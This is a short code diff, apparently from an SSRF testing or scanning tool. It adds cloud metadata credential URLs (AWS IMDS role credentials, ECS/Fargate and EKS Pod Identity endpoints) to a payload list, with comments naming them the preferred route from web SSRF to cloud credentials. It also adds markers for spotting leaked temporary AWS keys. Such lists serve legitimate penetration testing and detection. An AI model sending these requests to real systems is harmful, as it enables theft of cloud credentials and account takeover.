@@ -44,6 +44,12 @@ _INTERNAL_IPS = (
 
 _CLOUD_METADATA = (
     "http://169.254.169.254/latest/meta-data/",                # AWS IMDSv1
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS IMDSv1 role creds (direct)
+    # Header-less AWS credential endpoints — reachable via a plain parameter SSRF
+    # even when IMDSv1 is disabled (IMDSv2 needs a token PUT that a param SSRF
+    # cannot issue). These are the modern web->cloud cred pivot; keep them first.
+    "http://169.254.170.2/v2/credentials/",                    # AWS ECS/Fargate task-role creds
+    "http://169.254.170.23/v1/credentials",                    # AWS EKS Pod Identity creds (IPv4)
     "http://169.254.169.254/computeMetadata/v1/",              # GCP (needs Metadata-Flavor header)
     "http://metadata.google.internal/computeMetadata/v1/",     # GCP DNS variant
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
@@ -79,6 +85,8 @@ _SSRF_INDICATORS = (
     # AWS
     "ami-id", "instance-id", "iam/security-credentials", "instance-identity",
     "x-amz-", "AccessKeyId", "SecretAccessKey",
+    # Temp-credential JSON markers (IMDS role creds, ECS/EKS container creds)
+    "Expiration", "\"ASIA", "RoleArn",
     # GCP
     "computeMetadata", "project-id", "service-account",
     # Azure
